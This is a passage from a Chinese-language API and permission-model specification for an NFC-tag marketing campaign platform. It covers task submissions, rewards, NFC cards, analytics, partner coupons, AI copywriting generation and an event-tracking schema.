        "rejectReason": null,
        "createdAt": "2024-06-01T15:30:00Z"
      }
    ],
    "pagination": {...}
  }
}
```

#### GET /api/submissions/:id
提交记录详情

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid",
    "submissionNo": "SUB202406010001",
    "userId": "uuid",
    "userPhone": "13800138000",
    "userNickname": "用户昵称",
    "userAvatar": "https://xxx/avatar.jpg",
    "campaignId": "uuid",
    "campaignName": "活动名称",
    "taskId": "uuid",
    "taskName": "任务名称",
    "storeId": "uuid",
    "storeName": "门店名称",
    "status": 2,
    "content": {...},
    "proofImages": ["https://xxx/1.jpg"],
    "proofText": "点评内容...",
    "nfcTag": "NFC001",
    "deviceInfo": {
      "os": "iOS 17.0",
      "browser": "Wechat 8.0"
    },
    "location": {
      "latitude": 39.9042,
      "longitude": 116.4074
    },
    "ipAddress": "116.407.4.1",
    "reviewedAt": "2024-06-02T10:00:00Z",
    "reviewedByName": "审核员",
    "rejectReason": null,
    "reviewRemark": "审核通过",
    "createdAt": "2024-06-01T15:30:00Z"
  }
}
```

#### POST /api/submissions
创建提交记录(用户)

**Headers:** Authorization: Bearer {token}

**Request:**
```json
{
  "campaignId": "uuid",
  "taskId": "uuid",
  "nfcTag": "NFC001",
  "content": {
    "aiGeneratedText": "生成的文案内容"
  },
  "proofImages": ["https://xxx/proof.jpg"],
  "proofText": "用户填写的点评内容",
  "deviceInfo": {
    "os": "iOS 17.0",
    "browser": "Wechat 8.0",
    "model": "iPhone 15 Pro"
  },
  "location": {
    "latitude": 39.9042,
    "longitude": 116.4074
  }
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid",
    "submissionNo": "SUB202406010001",
    "status": 1
  }
}
```

#### PUT /api/submissions/:id
更新提交记录(用户撤回修改)

**Headers:** Authorization: Bearer {token}

**Request:**
```json
{
  "proofImages": ["https://xxx/new_proof.jpg"],
  "proofText": "更新后的点评内容"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### POST /api/submissions/:id/review
审核提交记录

**Headers:** Authorization: Bearer {token} (商家店员/店长/管理员)

**Request:**
```json
{
  "status": 2,
  "remark": "审核备注"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### POST /api/submissions/:id/recall
撤回提交

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### GET /api/submissions/my
我的提交记录(用户)

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- campaignId (uuid, optional)
- status (int, optional)
- page (int, default: 1)
- pageSize (int, default: 20)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "campaignId": "uuid",
        "campaignName": "活动名称",
        "campaignCover": "https://xxx/cover.jpg",
        "taskName": "任务名称",
        "status": 2,
        "completedAt": "2024-06-02T10:00:00Z",
        "rewardsEarned": [
          {
            "name": "优惠券",
            "value": 10.00
          }
        ]
      }
    ],
    "pagination": {...}
  }
}
```

---

### 3.7 奖励配置 /api/rewards/*

#### GET /api/campaigns/:campaignId/rewards
活动奖励列表

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": [
    {
      "id": "uuid",
      "name": "优惠券奖励",
      "rewardType": 1,
      "rewardTypeName": "优惠券",
      "value": 10.00,
      "totalQuantity": 1000,
      "claimedCount": 800,
      "usedCount": 500,
      "remainingQuantity": 200,
      "limitPerUser": 1,
      "minTaskCompleted": 3,
      "validDays": 30,
      "status": 1
    }
  ]
}
```

#### POST /api/campaigns/:campaignId/rewards
创建奖励配置

**Headers:** Authorization: Bearer {token} (商家管理员)

**Request:**
```json
{
  "name": "优惠券奖励",
  "rewardType": 1,
  "value": 10.00,
  "totalQuantity": 1000,
  "limitPerUser": 1,
  "minTaskCompleted": 3,
  "validDays": 30,
  "rules": {
    "minConsume": 50.00,
    "applicableProducts": ["全部商品"]
  }
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid"
  }
}
```

#### PUT /api/rewards/:id
更新奖励配置

**Headers:** Authorization: Bearer {token} (商家管理员)

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### DELETE /api/rewards/:id
删除奖励配置

**Headers:** Authorization: Bearer {token} (商家管理员)

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### POST /api/rewards/:id/claim
领取奖励(用户)

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "claimId": "uuid",
    "claimNo": "RC202406010001",
    "rewardType": 1,
    "rewardValue": 10.00,
    "couponCode": "COUPON123456",
    "qrCode": "https://xxx/qr.jpg",
    "expireAt": "2024-07-01T00:00:00Z"
  }
}
```

#### GET /api/rewards/claims
我的奖励领取记录

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- campaignId (uuid, optional)
- status (int, optional)
- page (int, default: 1)
- pageSize (int, default: 20)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "claimNo": "RC202406010001",
        "campaignName": "活动名称",
        "rewardName": "优惠券",
        "rewardType": 1,
        "rewardValue": 10.00,
        "status": 1,
        "statusName": "已领取",
        "expireAt": "2024-07-01T00:00:00Z",
        "claimedAt": "2024-06-01T15:30:00Z"
      }
    ],
    "pagination": {...}
  }
}
```

#### POST /api/rewards/claims/:id/verify
核销奖励(商家店员)

**Headers:** Authorization: Bearer {token}

**Request:**
```json
{
  "couponCode": "COUPON123456",
  "storeId": "uuid"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "claimId": "uuid",
    "status": 2,
    "usedAt": "2024-06-15T10:00:00Z",
    "usedStoreName": "门店名称"
  }
}
```

---

### 3.8 NFC相关 /api/nfc/*

#### POST /api/nfc/tap
NFC触碰

**Headers:** Authorization: Bearer {token} (可选)

**Request:**
```json
{
  "cardUid": "NFC_CARD_UID_XXX",
  "storeId": "uuid",
  "deviceInfo": {
    "os": "iOS 17.0",
    "model": "iPhone 15 Pro"
  },
  "location": {
    "latitude": 39.9042,
    "longitude": 116.4074
  }
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "cardId": "uuid",
    "cardNo": "NFC001",
    "storeId": "uuid",
    "storeName": "门店名称",
    "campaign": {
      "id": "uuid",
      "name": "活动名称",
      "coverImage": "https://xxx/cover.jpg",
      "startTime": "2024-06-01T00:00:00Z",
      "endTime": "2024-06-30T23:59:59Z",
      "status": 2
    },
    "userStatus": {
      "isParticipating": true,
      "currentTaskNo": 1,
      "completedTaskCount": 0,
      "canClaimReward": false
    }
  }
}
```

#### GET /api/nfc/cards
NFC卡列表

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- storeId (uuid, optional)
- status (int, optional)
- page (int, default: 1)
- pageSize (int, default: 20)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "storeId": "uuid",
        "storeName": "门店名称",
        "cardNo": "NFC001",
        "cardUid": "XXX",
        "cardType": 1,
        "cardTypeName": "桌贴",
        "locationDesc": "门口桌贴",
        "campaignId": "uuid",
        "campaignName": "当前活动",
        "status": 1,
        "tapCount": 100,
        "uniqueTapCount": 50,
        "lastTapAt": "2024-06-01T15:30:00Z",
        "activatedAt": "2024-05-01T00:00:00Z"
      }
    ],
    "pagination": {...}
  }
}
```

#### POST /api/nfc/cards
创建NFC卡

**Headers:** Authorization: Bearer {token} (商家管理员)

**Request:**
```json
{
  "storeId": "uuid",
  "cardNo": "NFC001",
  "cardUid": "NFC_CARD_UID_XXX",
  "cardType": 1,
  "locationDesc": "门口桌贴",
  "campaignId": "uuid"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid"
  }
}
```

#### PUT /api/nfc/cards/:id
更新NFC卡

**Headers:** Authorization: Bearer {token} (商家管理员)

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### POST /api/nfc/cards/bind-campaign
NFC卡绑定活动

**Headers:** Authorization: Bearer {token} (商家管理员)

**Request:**
```json
{
  "cardIds": ["uuid1", "uuid2"],
  "campaignId": "uuid"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### GET /api/nfc/cards/:id/stats
NFC卡统计

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "cardId": "uuid",
    "cardNo": "NFC001",
    "tapCount": 100,
    "uniqueTapCount": 50,
    "participationRate": "50%",
    "todayStats": {
      "tapCount": 10,
      "uniqueTapCount": 8,
      "newParticipations": 3
    },
    "trend": [
      {"date": "2024-05-28", "tapCount": 15},
      {"date": "2024-05-29", "tapCount": 12},
      {"date": "2024-05-30", "tapCount": 18}
    ]
  }
}
```

---

### 3.9 数据分析 /api/analytics/*

#### GET /api/analytics/overview
数据概览

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- merchantId (uuid, optional)
- campaignId (uuid, optional)
- startDate (ISO date, required)
- endDate (ISO date, required)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "summary": {
      "totalTapCount": 10000,
      "uniqueUserCount": 5000,
      "totalParticipation": 8000,
      "totalSuccess": 6000,
      "totalRewardClaimed": 5000,
      "totalRewardUsed": 3000,
      "totalCost": 50000.00
    },
    "trends": {
      "dates": ["2024-06-01", "2024-06-02", "2024-06-03"],
      "tapCounts": [100, 150, 120],
      "participations": [80, 100, 90],
      "successes": [60, 80, 70]
    },
    "conversionRates": {
      "tapToParticipate": "80%",
      "participateToSuccess": "75%",
      "claimToUse": "60%"
    }
  }
}
```

#### GET /api/analytics/campaigns/:campaignId
活动数据分析

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- startDate (ISO date, required)
- endDate (ISO date, required)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "campaignId": "uuid",
    "campaignName": "活动名称",
    "participationCount": 1000,
    "successCount": 800,
    "rewardClaimCount": 700,
    "rewardUseCount": 500,
    "taskStats": [
      {
        "taskNo": 1,
        "taskName": "第一关",
        "submitCount": 950,
        "passCount": 900,
        "passRate": "94.74%"
      },
      {
        "taskNo": 2,
        "taskName": "第二关",
        "submitCount": 850,
        "passCount": 800,
        "passRate": "94.12%"
      },
      {
        "taskNo": 3,
        "taskName": "第三关",
        "submitCount": 800,
        "passCount": 750,
        "passRate": "93.75%"
      }
    ],
    "hourlyDistribution": [
      {"hour": 9, "count": 50},
      {"hour": 10, "count": 80},
      {"hour": 11, "count": 100}
    ],
    "userPortrait": {
      "gender": {"male": 45, "female": 55},
      "age": {"18-25": 30, "26-35": 40, "36-45": 20, "45+": 10},
      "location": [
        {"province": "北京", "count": 500},
        {"province": "上海", "count": 300}
      ]
    }
  }
}
```

#### GET /api/analytics/stores/:storeId
门店数据分析

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "storeId": "uuid",
    "storeName": "门店名称",
    "nfcStats": [
      {
        "cardNo": "NFC001",
        "tapCount": 500,
        "uniqueTapCount": 300,
        "participations": 250
      }
    ],
    "dailyStats": [
      {
        "date": "2024-06-01",
        "tapCount": 50,
        "participation": 40,
        "success": 30
      }
    ],
    "ranking": {
      "withinMerchant": 1,
      "totalMerchants": 10
    }
  }
}
```

#### GET /api/analytics/users/:userId
用户行为分析

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "userId": "uuid",
    "userPhone": "138****8000",
    "totalParticipations": 5,
    "totalSuccess": 4,
    "totalRewardsClaimed": 10,
    "totalRewardsUsed": 6,
    "recentActivities": [
      {
        "campaignId": "uuid",
        "campaignName": "活动名称",
        "participatedAt": "2024-06-01T15:30:00Z",
        "status": "success"
      }
    ],
    "eventTimeline": [
      {
        "eventType": "nfc_tap",
        "timestamp": "2024-06-01T15:30:00Z",
        "data": {"storeId": "uuid", "campaignId": "uuid"}
      }
    ]
  }
}
```

#### GET /api/analytics/realtime
实时数据

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "timestamp": "2024-06-01T15:30:00Z",
    "todayStats": {
      "tapCount": 500,
      "participation": 300,
      "success": 250,
      "rewardClaim": 200
    },
    "currentOnline": 50,
    "activeCampaigns": 10,
    "topStores": [
      {"storeId": "uuid", "storeName": "门店A", "tapCount": 100},
      {"storeId": "uuid", "storeName": "门店B", "tapCount": 80}
    ]
  }
}
```

#### GET /api/analytics/export
导出数据

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- type (string, required): campaign, submission, reward, nfc
- campaignId (uuid, required for campaign/submission/reward)
- startDate (ISO date, required)
- endDate (ISO date, required)
- format (string, default: csv): csv, excel

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "downloadUrl": "https://cdn.xxx.com/exports/xxx.csv",
    "expiresAt": "2024-06-02T15:30:00Z"
  }
}
```

---

### 3.10 异业合作 /api/alliance/*

#### GET /api/alliance/partners
异业商家列表

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- merchantId (uuid, optional)
- status (int, optional)
- partnerType (int, optional)
- page (int, default: 1)
- pageSize (int, default: 20)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "merchantId": "uuid",
        "merchantName": "发起商家",
        "partnerName": "合作方名称",
        "partnerLogo": "https://xxx/logo.jpg",
        "partnerType": 1,
        "partnerTypeName": "优惠券合作",
        "contactName": "联系人",
        "contactPhone": "13800138000",
        "province": "北京市",
        "city": "北京市",
        "industry": "零售",
        "status": 1,
        "statusName": "合作中",
        "contractEnd": "2024-12-31",
        "commissionRate": 5.00,
        "couponCount": 3,
        "createdAt": "2024-01-15T10:30:00Z"
      }
    ],
    "pagination": {...}
  }
}
```

#### POST /api/alliance/partners
创建异业合作

**Headers:** Authorization: Bearer {token} (商家管理员)

**Request:**
```json
{
  "partnerName": "合作方名称",
  "partnerLogo": "https://xxx/logo.jpg",
  "partnerType": 1,
  "contactName": "联系人",
  "contactPhone": "13800138000",
  "contactWechat": "wechat_id",
  "province": "北京市",
  "city": "北京市",
  "industry": "零售",
  "description": "合作描述...",
  "contractStart": "2024-01-01",
  "contractEnd": "2024-12-31",
  "commissionRate": 5.00
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid"
  }
}
```

#### GET /api/alliance/partners/:id
异业商家详情

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid",
    "merchantId": "uuid",
    "merchantName": "发起商家",
    "partnerName": "合作方名称",
    "partnerLogo": "https://xxx/logo.jpg",
    "partnerType": 1,
    "partnerTypeName": "优惠券合作",
    "contactName": "联系人",
    "contactPhone": "13800138000",
    "contactWechat": "wechat_id",
    "province": "北京市",
    "city": "北京市",
    "industry": "零售",
    "description": "合作描述...",
    "contractStart": "2024-01-01",
    "contractEnd": "2024-12-31",
    "commissionRate": 5.00,
    "status": 1,
    "coupons": [...],
    "stats": {
      "totalCouponClaimed": 1000,
      "totalCouponUsed": 500,
      "totalCommission": 2500.00
    },
    "createdAt": "2024-01-15T10:30:00Z"
  }
}
```

#### GET /api/alliance/coupons
异业优惠券列表

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- partnerId (uuid, optional)
- campaignId (uuid, optional)
- status (int, optional)
- page (int, default: 1)
- pageSize (int, default: 20)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "partnerId": "uuid",
        "partnerName": "合作方名称",
        "campaignId": "uuid",
        "campaignName": "关联活动",
        "name": "优惠券名称",
        "description": "优惠券描述...",
        "couponType": 1,
        "couponTypeName": "满减券",
        "faceValue": 20.00,
        "minConsume": 100.00,
        "totalQuantity": 500,
        "claimedCount": 300,
        "usedCount": 150,
        "remainingQuantity": 200,
        "validStartAt": "2024-06-01T00:00:00Z",
        "validEndAt": "2024-06-30T23:59:59Z",
        "status": 2,
        "statusName": "投放中"
      }
    ],
    "pagination": {...}
  }
}
```

#### POST /api/alliance/coupons
创建异业优惠券

**Headers:** Authorization: Bearer {token} (商家管理员)

**Request:**
```json
{
  "partnerId": "uuid",
  "campaignId": "uuid",
  "name": "优惠券名称",
  "description": "优惠券描述...",
  "couponType": 1,
  "faceValue": 20.00,
  "minConsume": 100.00,
  "totalQuantity": 500,
  "perUserLimit": 1,
  "validDays": 30,
  "useRules": "使用规则描述...",
  "imageUrl": "https://xxx/coupon.jpg",
  "codePrefix": "COUP"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid"
  }
}
```

#### PUT /api/alliance/coupons/:id
更新异业优惠券

**Headers:** Authorization: Bearer {token} (商家管理员)

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### PUT /api/alliance/coupons/:id/status
更新优惠券状态

**Headers:** Authorization: Bearer {token} (商家管理员)

**Request:**
```json
{
  "status": 3
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### GET /api/alliance/coupons/claimable
可领取优惠券(用户端)

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- lat (float, optional)
- lng (float, optional)
- page (int, default: 1)
- pageSize (int, default: 20)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "partnerId": "uuid",
        "partnerName": "合作方名称",
        "partnerLogo": "https://xxx/logo.jpg",
        "name": "优惠券名称",
        "description": "优惠券描述...",
        "couponType": 1,
        "faceValue": 20.00,
        "minConsume": 100.00,
        "remainingQuantity": 200,
        "distance": 1.5,
        "imageUrl": "https://xxx/coupon.jpg"
      }
    ],
    "pagination": {...}
  }
}
```

#### POST /api/alliance/coupons/:id/claim
领取异业优惠券

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "claimId": "uuid",
    "claimNo": "CC202406010001",
    "couponCode": "COUP123456",
    "qrCode": "https://xxx/qr.jpg",
    "expireAt": "2024-07-01T00:00:00Z"
  }
}
```

#### GET /api/alliance/coupons/my
我的优惠券

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- status (int, optional)
- page (int, default: 1)
- pageSize (int, default: 20)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "claimNo": "CC202406010001",
        "couponId": "uuid",
        "couponName": "优惠券名称",
        "partnerName": "合作方名称",
        "partnerLogo": "https://xxx/logo.jpg",
        "couponType": 1,
        "faceValue": 20.00,
        "minConsume": 100.00,
        "couponCode": "COUP123456",
        "status": 1,
        "statusName": "已领取",
        "expireAt": "2024-07-01T00:00:00Z",
        "claimedAt": "2024-06-01T15:30:00Z"
      }
    ],
    "pagination": {...}
  }
}
```

#### POST /api/alliance/coupons/verify
核销优惠券

**Headers:** Authorization: Bearer {token}

**Request:**
```json
{
  "couponCode": "COUP123456",
  "storeName": "使用门店名称",
  "transactionNo": "ORDER123456"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "claimId": "uuid",
    "status": 2,
    "usedAt": "2024-06-15T10:00:00Z",
    "usedStoreName": "使用门店名称",
    "commission": 1.00
  }
}
```

---

### 3.11 AI相关 /api/ai/*

#### POST /api/ai/generate
AI生成内容

**Headers:** Authorization: Bearer {token}

**Request:**
```json
{
  "taskId": "uuid",
  "type": 1,
  "prompt": "生成一条吸引人的种草文案",
  "context": {
    "campaignId": "uuid",
    "storeName": "门店名称",
    "productName": "产品名称"
  }
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "generationId": "uuid",
    "content": "生成的文案内容...",
    "imageUrl": "https://xxx/image.jpg",
    "tokensUsed": 500,
    "model": "gpt-4o",
    "processingTime": 3000
  }
}
```

#### GET /api/ai/generations
AI生成记录

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- taskId (uuid, optional)
- type (int, optional)
- page (int, default: 1)
- pageSize (int, default: 20)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "taskId": "uuid",
        "taskName": "任务名称",
        "model": "gpt-4o",
        "prompt": "生成一条吸引人的种草文案",
        "content": "生成的文案内容...",
        "imageUrl": "https://xxx/image.jpg",
        "generationType": 1,
        "tokensUsed": 500,
        "cost": 0.01,
        "status": 1,
        "createdAt": "2024-06-01T15:30:00Z"
      }
    ],
    "pagination": {...}
  }
}
```

#### GET /api/ai/generations/:id
生成记录详情

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid",
    "taskId": "uuid",
    "taskName": "任务名称",
    "model": "gpt-4o",
    "prompt": "生成一条吸引人的种草文案",
    "content": "生成的文案内容...",
    "imageUrl": "https://xxx/image.jpg",
    "generationType": 1,
    "tokensUsed": 500,
    "cost": 0.01,
    "processingTime": 3000,
    "status": 1,
    "createdAt": "2024-06-01T15:30:00Z"
  }
}
```

#### POST /api/ai/regenerate
重新生成

**Headers:** Authorization: Bearer {token}

**Request:**
```json
{
  "generationId": "uuid",
  "feedback": "语气再活泼一些"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "generationId": "uuid",
    "content": "新生成的文案内容...",
    "tokensUsed": 520,
    "cost": 0.011
  }
}
```

---

## 4. 权限模型

### 4.1 角色定义

#### 4.1.1 顾客 (Customer)

| 权限 | 说明 |
|------|------|
| auth:login | 登录 |
| auth:profile | 查看/修改个人信息 |
| campaigns:public | 查看公开活动 |
| submissions:create | 创建任务提交 |
| submissions:my | 查看我的提交 |
| rewards:claim | 领取奖励 |
| rewards:my | 查看我的奖励 |
| alliance:coupons:claimable | 查看可领取优惠券 |
| alliance:coupons:claim | 领取优惠券 |
| alliance:coupons:my | 查看我的优惠券 |
| ai:generate | 使用AI生成 |

#### 4.1.2 商家 (Merchant)

**商家管理员 (Merchant Admin)**
继承顾客所有权限，并拥有:

| 权限 | 说明 |
|------|------|
| merchants:read:own | 查看商家信息 |
| merchants:update:own | 更新商家信息 |
| stores:* | 门店管理 |
| campaigns:* | 活动管理 |
| tasks:* | 任务配置管理 |
| submissions:* | 任务审核 |
| rewards:* | 奖励管理 |
| nfc:* | NFC卡管理 |
| staff:* | 员工管理 |
| alliance:* | 异业合作管理 |
| analytics:* | 数据分析 |

**店长 (Store Manager)**
| 权限 | 说明 |
|------|------|
| stores:read:assigned | 查看所管门店 |
| campaigns:read:assigned | 查看所管门店活动 |
| submissions:review | 审核提交 |
| rewards:verify | 核销奖励 |
| nfc:read | 查看NFC卡 |
| analytics:store | 门店数据分析 |

**店员 (Staff)**
| 权限 | 说明 |
|------|------|
| campaigns:read:assigned | 查看活动 |
| submissions:review:read | 查看待审核提交 |
| rewards:verify | 核销奖励 |
| nfc:read | 查看NFC卡 |

#### 4.1.3 平台方 (Platform)

**平台管理员 (Platform Admin)**
| 权限 | 说明 |
|------|------|
| *:* | 所有权限 |

**运营人员 (Operator)**
| 权限 | 说明 |
|------|------|
| merchants:read | 查看商家 |
| merchants:review | 审核商家 |
| merchants:stats | 商家统计 |
| campaigns:review | 审核活动 |
| analytics:platform | 平台数据分析 |
| audit:read | 审计日志 |

**客服 (Support)**
| 权限 | 说明 |
|------|------|
| users:read | 查看用户 |
| submissions:read | 查看提交 |
| rewards:read | 查看奖励 |
| audit:read | 审计日志 |

### 4.2 权限矩阵

| 功能 | 顾客 | 店员 | 店长 | 商家管理员 | 运营人员 | 平台管理员 |
|------|------|------|------|-----------|---------|-----------|
| 登录/注册 | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| 查看活动 | 公开 | 指定门店 | 指定门店 | 全部 | ✓ | ✓ |
| 参与活动 | ✓ | | | | | |
| 创建活动 | | | | ✓ | | |
| 提交审核 | | | | ✓ | | |
| 审核活动 | | | | | ✓ | ✓ |
| 审核提交 | | ✓ | ✓ | ✓ | | |
| 管理门店 | | | | ✓ | | |
| 管理员工 | | | | ✓ | | |
| 管理NFC | | | | ✓ | | |
| 核销奖励 | | ✓ | ✓ | ✓ | | |
| 数据分析 | | | 门店 | 全部 | 平台 | 全部 |
| 异业合作 | | | | ✓ | | |
| 系统配置 | | | | | | ✓ |

### 4.3 权限实现

#### 4.3.1 JWT Token结构

```json
{
  "sub": "user_id",
  "role": "merchant_admin",
  "merchantId": "uuid",
  "storeIds": ["uuid1", "uuid2"],
  "permissions": ["campaigns:create", "stores:manage", ...],
  "iat": 1717200000,
  "exp": 1717203600
}
```

#### 4.3.2 权限中间件

```typescript
// 权限检查伪代码
function checkPermission(user, resource, action) {
  // 1. 平台管理员拥有所有权限
  if (user.role === 'platform_admin') return true;
  
  // 2. 检查用户权限列表
  const permission = `${resource}:${action}`;
  if (user.permissions.includes(permission)) return true;
  
  // 3. 通配符权限
  if (user.permissions.includes(`${resource}:*`)) return true;
  if (user.permissions.includes(`*:*`)) return true;
  
  return false;
}

// 资源级别的权限检查
function checkResourceAccess(user, resourceId, resourceType) {
  if (user.role === 'platform_admin') return true;
  
  if (user.role === 'merchant_admin' || user.role === 'store_manager') {
    return checkMerchantAccess(user.merchantId, resourceId, resourceType);
  }
  
  return false;
}
```

---

## 5. 事件埋点方案

### 5.1 事件采集架构

```
用户端(H5/小程序)
    ↓ 实时上报
事件采集服务(/api/events)
    ↓
Kafka消息队列
    ↓
事件消费服务
    ↓ ↓ ↓
存储层    分析层    实时计算层
(clickhouse)  (Presto)  (Flink)
```

### 5.2 事件数据模型

```typescript
interface BaseEvent {
  eventType: string;        // 事件类型
  userId?: string;          // 用户ID(已登录)
  anonymousId?: string;      // 匿名ID
  sessionId: string;        // 会话ID
  timestamp: number;        // 时间戳(ms)
  clientTime: string;        // 客户端时间(ISO)
  url: string;              // 页面URL
  referrer?: string;        // 来源URL
  
  // 设备信息
  device: {
    type: 'mobile' | 'tablet' | 'desktop';
    os: string;             // iOS, Android, Windows, macOS
    osVersion: string;
    browser: string;
    browserVersion: string;
    screen: string;         // 1920x1080
    network: string;        // WiFi, 4G, 5G
    language: string;
  };
  
  // 位置信息
  location?: {
    latitude: number;
    longitude: number;
    accuracy?: number;
    country?: string;
    province?: string;
    city?: string;
  };
  
  // IP信息(服务端补充)
  ip?: string;
  ipCountry?: string;
  ipProvince?: string;
  ipCity?: string;
}
```

### 5.3 15个核心事件详细设计

#### 5.3.1 nfc_tap
NFC触碰事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | nfc_tap | |
| cardId | string | NFC卡ID | uuid |
| cardNo | string | NFC卡号 | NFC001 |
| cardType | int | 卡类型 | 1 |
| storeId | string | 门店ID | uuid |
| storeName | string | 门店名称 | 某某店 |
| merchantId | string | 商家ID | uuid |
| merchantName | string | 商家名称 | 某某商家 |
| campaignId | string | 活动ID(如有) | uuid |
| campaignName | string | 活动名称 | 618活动 |
| userStatus | object | 用户状态 | {isParticipating: false} |
| tapSource | string | 触发来源 | nfc_tag, qr_code |
| hardwareModel | string | 设备型号 | iPhone 15 Pro |
| nfcSignalStrength | number | NFC信号强度 | -50 |

#### 5.3.2 page_view
页面浏览事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | page_view | |
| pageName | string | 页面名称 | activity_detail |
| pageTitle | string | 页面标题 | 活动详情 |
| pageCategory | string | 页面分类 | campaign, reward, store |
| campaignId | string | 关联活动ID | uuid |
| merchantId | string | 关联商家ID | uuid |
| storeId | string | 关联门店ID | uuid |
| referrerPage | string | 来源页面 | home |
| referrerType | string | 来源类型 | direct, campaign, reward |
| scrollDepth | number | 滚动深度(0-100) | 50 |
|停留时长 | number | 停留时长(秒) | 30 |
| isEntryPage | boolean | 是否入口页面 | true |

#### 5.3.3 rule_view
规则查看事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | rule_view | |
| campaignId | string | 活动ID | uuid |
| campaignName | string | 活动名称 | 618活动 |
| ruleType | string | 规则类型 | activity_rule, task_rule, reward_rule |
| taskId | string | 任务ID(任务规则) | uuid |
| viewDuration | number | 查看时长(秒) | 15 |
| expandedSections | array | 展开的章节 | ["奖励规则", "参与条件"] |
| shareClicked | boolean | 是否点击分享 | true |

#### 5.3.4 task_start
任务开始事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | task_start | |
| campaignId | string | 活动ID | uuid |
| campaignName | string | 活动名称 | 618活动 |
| taskId | string | 任务ID | uuid |
| taskNo | int | 任务序号 | 1 |
| taskType | int | 任务类型 | 1 |
| taskName | string | 任务名称 | 第一关 |
| storeId | string | 门店ID | uuid |
| merchantId | string | 商家ID | uuid |
| previousTaskStatus | object | 前置任务状态 | {taskNo1: "completed"} |
| entrySource | string | 进入来源 | nfc_tap, page_view, notification |
| taskDuration | number | 任务时长(秒) | 120 |
| completed | boolean | 是否完成 | false |
| abortReason | string | 中断原因(未完成) | page_exit, system_error |

#### 5.3.5 task_submit
任务提交事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | task_submit | |
| campaignId | string | 活动ID | uuid |
| campaignName | string | 活动名称 | 618活动 |
| taskId | string | 任务ID | uuid |
| taskNo | int | 任务序号 | 1 |
| taskType | int | 任务类型 | 1 |
| submissionId | string | 提交ID | uuid |
| storeId | string | 门店ID | uuid |
| merchantId | string | 商家ID | uuid |
| nfcTag | string | NFC标签 | NFC001 |
| aiGenerationId | string | AI生成ID(如有) | uuid |
| contentLength | number | 内容长度 | 200 |
| proofUploaded | boolean | 是否上传凭证 | true |
